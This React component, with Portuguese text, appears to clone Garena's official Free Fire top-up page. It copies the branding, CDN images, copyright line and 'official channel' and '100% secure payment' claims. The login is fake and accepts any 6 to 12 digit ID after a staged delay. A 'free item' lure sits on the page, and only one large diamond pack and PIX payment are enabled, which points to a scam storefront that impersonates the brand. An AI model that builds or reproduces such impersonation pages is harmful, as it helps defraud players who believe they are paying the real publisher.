// CheckoutGarena.tsx
import React, { useEffect, useRef, useState } from "react";
import "../styles/checkout-garena.css";




// Slick CSS (assegure que essas dependências existam no node_modules ou ajuste o caminho)
import "slick-carousel/slick/slick.css";
import "slick-carousel/slick/slick-theme.css";

// Nota: o plugin slick (JS) e o jQuery devem ser carregados globalmente (ex.: <script> no index.html).
// Se você prefere, copie ./public/js/jquery.min.js e ./public/js/slick.min.js e adicione <script> tags no index.html
interface LoginProps {
  onGoToCheckoutPage: () => void;
}

interface Offer {
  id: number;
  img: string;
  titulo: string;
  descricao: string;
}



export default function Login({ onGoToCheckoutPage }: LoginProps) {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [playerId, setPlayerId] = useState('');
  const [showInfo, setShowInfo] = useState(0);

  const [activeModal, setActiveModal] = useState<Offer | null>(null);



  const offers = [
    {
      id: "assinatura_semanal",
      titulo: "Assinatura Semanal",
      img: "https://cdn-gop.garenanow.com/gop/app/0000/100/067/rebate/0000/000/002/logo.png",
      descricao:
        "Ganhe 60 diamantes agora e resgate 40 diamantes todos os dias no jogo durante 7 dias! Total de 340 diamantes.",
    },
    {
      id: "assinatura_mensal",
      titulo: "Assinatura Mensal",
      img: "https://cdn-gop.garenanow.com/gop/app/0000/100/067/rebate/0000/081/041/logo.png",
      descricao:
        "Ganhe 300 diamantes agora e resgate 50 diamantes todos os dias no jogo, durante 30 dias! Você receberá 1800 diamantes no total.",
    },
    {
      id: "premium_plus",
      titulo: "Passe Booyah Premium Plus",
      img: "https://cdn-gop.garenanow.com/gop/app/0000/100/067/item/0801/039/054/pt/logo.png",
      descricao:
        "Ganhe todos os privilégios e recompensas do Booyah Pass Premium + recompensas exclusivas + 50 níveis do Booyah Pass instantaneamente.",
    },
    {
      id: "trilha_3",
      titulo: "Trilha da Evolução – 3 dias",
      img: "https://cdn-gop.garenanow.com/gop/app/0000/100/067/rebate/0000/004/608/logo.png",
      descricao:
        "Obtenha 3 dias de acesso a algumas armas evolutivas e muitas recompensas mais",
    },
    {
      id: "trilha_7",
      titulo: "Trilha da Evolução – 7 dias",
      img: "https://cdn-gop.garenanow.com/gop/app/0000/100/067/rebate/0000/004/609/logo.png",
      descricao:
        "Obtenha 7 dias de acesso a algumas armas evolutivas e muitas recompensas mais",
    },
    {
      id: "trilha_30",
      titulo: "Trilha da Evolução – 30 dias",
      img: "https://cdn-gop.garenanow.com/gop/app/0000/100/067/rebate/0000/004/610/logo.png",
      descricao:
        "Obtenha 30 dias de acesso a algumas armas evolutivas e muitas recompensas mais",
    },
    {
      id: "economica",
      titulo: "Semanal Econômica",
      img: "https://cdn-gop.garenanow.com/gop/app/0000/100/067/rebate/0000/004/007/logo.png",
      descricao:
        "Ganhe 12 diamantes agora e resgate 5 diamantes todos os dias no jogo, durante 7 dias! Você receberá 47 diamantes no total.",
    },
    {
      id: "passe_booyah",
      titulo: "Passe Booyah",
      img: "https://cdn-gop.garenanow.com/gop/app/0000/100/067/item/0803/000/000/logo.png",
      descricao:
        "Compra direta do Passe Booyah (não compre se já tiver feito a compra no jogo, caso contrário, receberá apenas 10 tokens FF)",
    },
  ];

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const pid = params.get('player_id');
    if (pid && /^\d{6,12}$/.test(pid)) {
      setIsLoggedIn(true);
      setPlayerId(pid);
    }

    const script = document.createElement('script');
    script.src = 'https://code.jquery.com/jquery-3.6.0.min.js';
    script.onload = () => {
      const slickScript = document.createElement('script');
      slickScript.src = 'https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js';
      slickScript.onload = () => {
        if (window.$) {
          (window.$ as any)('.list-banners').slick({
            centerMode: true,
            slidesToShow: 1,
            autoplay: true,
            autoplaySpeed: 5000,
            prevArrow: '.arrow-banner.arrow-left',
            nextArrow: '.arrow-banner.arrow-right',
            dots: true
          });
        }
      };
      document.body.appendChild(slickScript);
    };
    document.body.appendChild(script);

    const slickCSS = document.createElement('link');
    slickCSS.rel = 'stylesheet';
    slickCSS.href = 'https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css';
    document.head.appendChild(slickCSS);

    return () => {
      if (window.$ && (window.$ as any)('.list-banners').hasClass('slick-initialized')) {
        (window.$ as any)('.list-banners').slick('unslick');
      }
    };
  }, []);


  // LOGIN
  const handleLogin = () => {
    const input = document.getElementById("id") as HTMLInputElement | null;
    const playerUid = input?.value || "";
    const messageEl = document.querySelector(".messageSection");
    if (!playerUid) {
      if (messageEl) messageEl.textContent = "Por favor, insira seu ID.";
      return;
    }
    if (!/^\d{6,12}$/.test(playerUid)) {
      if (messageEl) messageEl.textContent = "ID inválido. Use 6 a 12 números.";
      return;
    }

    const loader = document.getElementById("loader");
    const form = document.querySelector(".form-login") as HTMLElement | null;

    if (loader && form) {
      loader.style.display = "block";
      form.style.display = "none";
    }

    // Mostra pelo menos 1.5 segundos de loading
    setTimeout(() => {
      setIsLoggedIn(true);

      // só depois troca de página!
      onGoToCheckoutPage();
    }, 1500);
  };
  // SCROLL para login (Resgatar)
  const handleResgatar = (e: React.MouseEvent) => {
    e.preventDefault();
    const target = document.querySelector(".login-area");
    if (!target) return;
    const headerH = document.querySelector("header.sticky")?.clientHeight || 0;
    window.scrollTo({
      top: target.getBoundingClientRect().top + window.scrollY - headerH - 10,
      behavior: "smooth",
    });
    setTimeout(() => {
      const input = document.getElementById("id") as HTMLInputElement | null;
      input?.focus();
    }, 600);
  };



  return (
    <div className="checkout-garena-wrapper">
      <main id="content-page">
        {/* HEADER */}
        <header className="sticky">
          <div className="container">
            <div className="d-flex align-items-center justify-content-between">
              <a href="/" className="d-flex align-items-center">
                <div className="d-flex align-items-center">
                  <img
                    src="images/logo-mobile.svg"
                    alt="Garena"
                    className="d-block d-lg-none d-xl-none"
                  />
                  <img src="images/logo.svg" alt="Garena" className="d-none d-lg-block d-xl-block" />
                  <div className="border-e"></div>
                </div>
                <div className="text">Canal Oficial de Recarga</div>
              </a>

              <div className="d-flex align-items-center justify-content-center">
                <img src="images/avatar.svg" alt="Player Avatar" width={30} style={{ borderRadius: "50%" }} />
              </div>
            </div>
          </div>
        </header>

        <div className="banner">
          <div className="banners">
            <div className="list-banners">
              <div className="item">
                <img src="images/banner.png" alt="Free Fire" />
              </div>
              <div className="item">
                <img src="images/banner_02.png" alt="Free Fire" />
              </div>
              <div className="item">
                <img src="images/banner_03.png" alt="Free Fire" />
              </div>
            </div>
            <div className="arrow-banner arrow-left">
              <svg width="1em" height="1em" viewBox="0 0 7 13" fill="none" xmlns="http://www.w3.org/2000/svg" className="-scale-x-100 rtl:scale-x-100">
                <path d="M6.81438 5.99466L1.68092 0.209207C1.43343 -0.0697356 1.03194 -0.0697356 0.784449 0.209207L0.185654 0.884087C-0.0615759 1.16273 -0.0618396 1.61404 0.184598 1.89328L4.25306 6.49985L0.184862 11.1067C-0.0618401 11.386 -0.0613112 11.8373 0.185919 12.1159L0.784713 12.7908C1.03221 13.0697 1.43369 13.0697 1.68119 12.7908L6.81438 7.00504C7.06187 6.7261 7.06187 6.2736 6.81438 5.99466Z" fill="currentColor"></path>
              </svg>
            </div>
            <div className="arrow-banner arrow-right">
              <svg width="1em" height="1em" viewBox="0 0 7 13" fill="none" xmlns="http://www.w3.org/2000/svg" className="scale-x-100 rtl:-scale-x-100">
                <path d="M6.81438 5.99466L1.68092 0.209207C1.43343 -0.0697356 1.03194 -0.0697356 0.784449 0.209207L0.185654 0.884087C-0.0615759 1.16273 -0.0618396 1.61404 0.184598 1.89328L4.25306 6.49985L0.184862 11.1067C-0.0618401 11.386 -0.0613112 11.8373 0.185919 12.1159L0.784713 12.7908C1.03221 13.0697 1.43369 13.0697 1.68119 12.7908L6.81438 7.00504C7.06187 6.7261 7.06187 6.2736 6.81438 5.99466Z" fill="currentColor"></path>
              </svg>
            </div>
            <div className="overlay-left overlay-banner"></div>
            <div className="overlay-right overlay-banner"></div>

          </div>
        </div>

        <div className="headline">
          <div className="overlay">
            <div className="overlay-l"></div>
            <img src="images/cover.svg" alt="FreeFire" className="d-none d-lg-block d-xl-block" />
            <img src="images/cover-mobile.svg" alt="FreeFire" className="d-block d-lg-none d-xl-none" />
            <div className="overlay-r"></div>
          </div>
          <div className="container">
            <h3>Seleção de jogos</h3>
            <div className="jogos d-flex align-items-center">
              <div className="jogo active">
                <img src="images/icon.png" alt="Free Fire" />
                <span>Free Fire</span>
              </div>
              <div className="jogo disabled">
                <img src="images/icon_c.png" alt="Delta Force" />
                <span>Delta Force</span>
              </div>
              <div className="jogo disabled">
                <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/153/icon.png" alt="Delta Force" />
                <span>HAIKYU!! FLY HIGH</span>
              </div>
            </div>
          </div>
        </div>

        {/* BODY */}
        <div className="body">
          <div className="container">








            <div className="container">
              <div className="banner-ff">
                <div className="info-jogo">
                  <div className="image">
                    <img src="images/icon.png" alt="Compra 100% segura" />
                  </div>
                  <div className="text">
                    <h2>Free Fire</h2>
                    <span><svg width="1em" height="1em" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg" class="me-1"><path d="M54.125 34.1211C55.2966 32.9495 55.2966 31.05 54.125 29.8784C52.9534 28.7069 51.0539 28.7069 49.8823 29.8784L38.0037 41.7571L32.125 35.8784C30.9534 34.7069 29.0539 34.7069 27.8823 35.8784C26.7108 37.05 26.7108 38.9495 27.8823 40.1211L35.8823 48.1211C37.0539 49.2926 38.9534 49.2926 40.125 48.1211L54.125 34.1211Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M43.4187 3.4715C41.2965 2.28554 38.711 2.28554 36.5889 3.4715L8.07673 19.4055C6.19794 20.4555 4.97252 22.4636 5.02506 24.7075C5.36979 39.43 10.1986 63.724 37.0183 76.9041C38.8951 77.8264 41.1125 77.8264 42.9893 76.9041C69.809 63.724 74.6377 39.43 74.9825 24.7075C75.035 22.4636 73.8096 20.4555 71.9308 19.4055L43.4187 3.4715ZM39.5159 8.7091C39.8191 8.53968 40.1885 8.53968 40.4916 8.7091L68.9826 24.6313C68.6493 38.3453 64.2154 59.7875 40.343 71.5192C40.135 71.6214 39.8725 71.6214 39.6646 71.5192C15.7921 59.7875 11.3583 38.3453 11.025 24.6313L39.5159 8.7091Z" fill="currentColor"></path></svg>Pagamento 100% Seguro</span>
                  </div>
                </div>
              </div>
            </div>
            {/* Item Gratis / Login area */}
            <div className="item-gratis">
              <div className="content-item d-flex align-items-center justify-content-between">
                <div className="item">
                  <h3>Item Grátis</h3>
                  <p>Resgate aqui seus itens exclusivos grátis</p>
                  <a href="#" className="btn-gratis" onClick={handleResgatar}>
                    Resgatar
                  </a>
                </div>

                <div className="icone">
                  <img
                    src="images/pacote-armas.png"
                    alt="Pacote de Armas Armadura Aprimorada"
                    title="Pacote de Armas Armadura Aprimorada"
                  />
                  <span className="d-flex align-items-center">
                    <span>Pacote de Armas Armadura Aprimorada</span>
                    <i className="fa-regular fa-circle-info" style={{ marginLeft: 6 }}></i>
                  </span>
                </div>
              </div>
            </div>

            <img
              src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/event/0000/000/226/special_event_revamp.png"
              alt="Evento Especial"
              title="Evento Especial"
              className="event-img"

            />

            {/* IEventos Especiais / Login area */}

            <div className="eventos-especiais">
              <div className="content-item d-flex align-items-center justify-content-between">
                <div className="evento">
                  <h3>Eventos especiais</h3>

                </div>
              </div>
            </div>


            <span className="event-span">
              PALPITEIROS FFWS 2025: DÊ SEU PALPITE!
            </span>


            <div className="login-area">
              <div className="title-section">
                <span>1</span>
                <h2>Login</h2>
              </div>

              <div className="box-login">
                <div className="content">
                  <h3>ID do jogador <i className="fa-regular fa-circle-question"></i></h3>

                  <form autoComplete="OFF" className="form-login align-items-center flex-wrap" onSubmit={(e) => e.preventDefault()}>
                    <input className="input-id" id="id" name="id" placeholder="Insira o ID de jogador aqui" required />
                    <button type="button" id="btnLogar" className="btn-login" onClick={handleLogin}>Login</button>
                    <span className="messageSection w-100"></span>
                  </form>

                  <div className="loader" id="loader"></div>

                  <div className="social d-flex align-items-center justify-content-between">
                    <span>Ou entre com sua conta de jogo</span>
                    <div className="redes d-flex align-items-center">
                      <a href="#"><img src="images/ic-fb-485c92b0.svg" alt="Facebook" /></a>
                      <a href="#"><img src="images/ic-google-d2ceaa95.svg" alt="Google Play" /></a>
                      <a href="#"><img src="images/ic-twitter-92527e61.svg" alt="Twitter" /></a>
                      <a href="#"><img src="images/ic-vk-abadf989.svg" alt="VK" /></a>
                    </div>
                  </div>

                </div>
              </div>

              {/* Offers Areas*/}

              <div className="diamonds-section">
                <div className="title-section">
                  <span>2</span>
                  <h2>Valor de Recarga</h2>
                </div>

                {/* Botões Comprar / Resgatar */}
                <div className="buy-redeem-buttons">
                  <button className="btn-buy active">Comprar</button>
                  <button className="btn-redeem disabled">Resgatar</button>
                </div>

                {/* GRID DE DIAMANTES */}
                <div className="diamonds-grid">

                  <div className="diamond-card disabled">
                    <span className="diamond-icon"><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /></span>
                    <span className="diamond-value">65</span>
                  </div>

                  <div className="diamond-card disabled">
                    <span className="diamond-icon"><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /></span>
                    <span className="diamond-value">100</span>
                  </div>

                  <div className="diamond-card disabled">
                    <span className="diamond-icon"><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /></span>
                    <span className="diamond-value">310</span>
                  </div>

                  <div className="diamond-card disabled">
                    <span className="diamond-icon"><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /></span>
                    <span className="diamond-value">520</span>
                  </div>

                  <div className="diamond-card disabled">
                    <span className="diamond-icon"><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /></span>
                    <span className="diamond-value">1.060</span>
                  </div>

                  <div className="diamond-card disabled">
                    <span className="diamond-icon"><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /></span>
                    <span className="diamond-value">2.180</span>
                  </div>

                  {/* ÚNICO ATIVO */}
                  <div className="diamond-card active">
                    <span className="diamond-icon"><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /></span>
                    <span className="diamond-value">5.600</span>
                  </div>

                  
                </div>
              </div>

              <p className="ofertas-title">Ofertas especiais</p>


              {/* OFERTAS ESPECIAIS */}
              <div className="offers-grid">
        
                {offers.map((offer) => (
                  <div className="offer-card" key={offer.id}>
                    <img src={offer.img} alt={offer.titulo} />
                    <div style={{}} className="offer-info">
                      <span >{offer.titulo}</span>
                      <button
                        className="info-btn"
                        onClick={() => setActiveModal(offer)}
                        dangerouslySetInnerHTML={{
                          __html: ` <svg width='1em' height='1em' viewBox='0 0 80 80' fill='none' xmlns='http://www.w3.org/2000/svg'><path d='M44 26C44 23.7909 42.2091 22 40 22C37.7909 22 36 23.7909 36 26C36 28.2091 37.7909 30 40 30C42.2091 30 44 28.2091 44 26Z' fill='currentColor'></path><path d='M43 54C43 55.6569 41.6569 57 40 57C38.3431 57 37 55.6569 37 54V37C37 35.3431 38.3431 34 40 34C41.6569 34 43 35.3431 43 37V54Z' fill='currentColor'></path><path fill-rule='evenodd' clip-rule='evenodd' d='M5 25C5 13.9543 13.9543 5 25 5H55C66.0457 5 75 13.9543 75 25V55C75 66.0457 66.0457 75 55 75H25C13.9543 75 5 66.0457 5 55V25ZM25 11H55C62.732 11 69 17.268 69 25V55C69 62.732 62.732 69 55 69H25C17.268 69 11 62.732 11 55V25C11 17.268 17.268 11 25 11Z' fill='currentColor'></path></svg>`
                        }}
                      />
                    </div>
                  </div>
                ))}
              </div>


              {activeModal && (
                <div className="offer-modal">
                  <div className="modal-content">
                    <img src={activeModal?.img} alt={activeModal?.titulo} />
                    <h2>{activeModal?.titulo}</h2>
                    <p>{activeModal?.descricao}</p>

                    <button className="close-btn" onClick={() => setActiveModal(null)}>
                      OK
                    </button>
                  </div>
                </div>
              )}



              {/* Método Pagamento */}
              <div className="payment-area">
                <div className="title-section">
                  <span>3</span>
                  <h2>Método de pagamento</h2>
                </div>

                <div className="payment-info">

                  <p>
                    <svg width="1em" height="1em" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg" className="inline-block align-middle text-base/none"><path fill-rule="evenodd" clip-rule="evenodd" d="M9 18C9 11.9249 13.9249 7 20 7H60C66.0751 7 71 11.9249 71 18V62C71 68.0751 66.0751 73 60 73H20C13.9249 73 9 68.0751 9 62V18ZM20 13C17.2386 13 15 15.2386 15 18V62C15 64.7614 17.2386 67 20 67H60C62.7614 67 65 64.7614 65 62V18C65 15.2386 62.7614 13 60 13H20ZM23 31C23 29.3431 24.3431 28 26 28H54C55.6569 28 57 29.3431 57 31C57 32.6569 55.6569 34 54 34H26C24.3431 34 23 32.6569 23 31ZM26 46C24.3431 46 23 47.3431 23 49C23 50.6569 24.3431 52 26 52H42C43.6569 52 45 50.6569 45 49C45 47.3431 43.6569 46 42 46H26Z" fill="currentColor"></path></svg>
                    Utilize sua instituição financeira para realizar o pagamento.
                  </p>
                  <p>Seus créditos caem na sua conta de jogo assim que recebermos a confirmação de pagamento.</p>
                  <p>[Para FF] Além dos diamantes em bônus, você ganha + 20% de bônus em itens dentro do jogo.</p>
                </div>


                <div className="payment-grid">

                  {/* PIX - ATIVO */}
                  <div className="payment-card active">
                    <img
                      src="https://cdn-gop.garenanow.com/webmain/static/payment_center/br/menu/pix_boa_mb.png"
                      alt="PIX"
                      className="payment-img"
                    />
                    <span className="promo-tag active">PROMO</span><span className="promo-tag"><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /> PROMO</span>
                  </div>

                  {/* NUPay */}
                  <div className="payment-card disabled">
                    <img
                      src="https://cdn-gop.garenanow.com/webmain/static/payment_center/br/menu/br_nupay_mb.png"
                      alt="NUPay"
                      className="payment-img"
                    />
                    <span className="promo-tag"><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /> PROMO</span>
                  </div>

                  {/* PicPay */}
                  <div className="payment-card disabled">
                    <img
                      src="https://cdn-gop.garenanow.com/webmain/static/payment_center/br/menu/picpay_mb.png"
                      alt="PicPay"
                      className="payment-img"
                    />
                    <span className="promo-tag"><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /> PROMO</span>
                  </div>

                  {/* Cartões */}
                  <div className="payment-card disabled">
                    <img
                      src="https://cdn-gop.garenanow.com/webmain/static/payment_center/br/menu/creditcard_mb.png"
                      alt="Cartões"
                      className="payment-img"
                    />
                    <span className="promo-tag"><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /> PROMO</span>
                  </div>

                  {/* PayPal */}
                  <div className="payment-card disabled">
                    <img
                      src="https://cdn-gop.garenanow.com/webmain/static/payment_center/br/menu/br_direct_ewallet_mb_NEW.png"
                      alt="Paypal"
                      className="payment-img"
                    />
                    <span className="promo-tag"><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /> PROMO</span>
                  </div>

                  {/* Gold */}
                  <div className="payment-card disabled">
                    <img
                      src="https://cdn-gop.garenanow.com/gop/static/channel/0000/211/137/icon.png"
                      alt="Gold"
                      className="payment-img"
                    />
                    <span className="promo-tag"><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /> PROMO</span>
                  </div>

                  {/* Boleto */}
                  <div className="payment-card disabled">
                    <img
                      src="https://cdn-gop.garenanow.com/webmain/static/payment_center/br/menu/boleto_mb.png"
                      alt="Boleto"
                      className="payment-img"
                    />
                    <span className="promo-tag"><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /> PROMO</span>
                  </div>
                </div>
              </div>



              <div className="footer" style={{ marginTop: '28px' }}>
                <div className="container">
                  <div className="content-footer d-flex align-items-center justify-content-between" style={{ padding: '18px 0' }}>
                    <span>© Garena Online. Todos os direitos reservados.</span>
                    <div className="links-footer">
                      <a href="#">FAQ</a>
                      <a href="#">Termos e Condições</a>
                      <a href="#">Política de Privacidade</a>
                    </div>
                  </div>
                </div>
              </div>

            </div>

          </div>
        </div>
      </main >
    </div >
  );
}

// Tornar window.$ tipado (se usar TS)
declare global {
  interface Window {
    $?: any;
  }
}
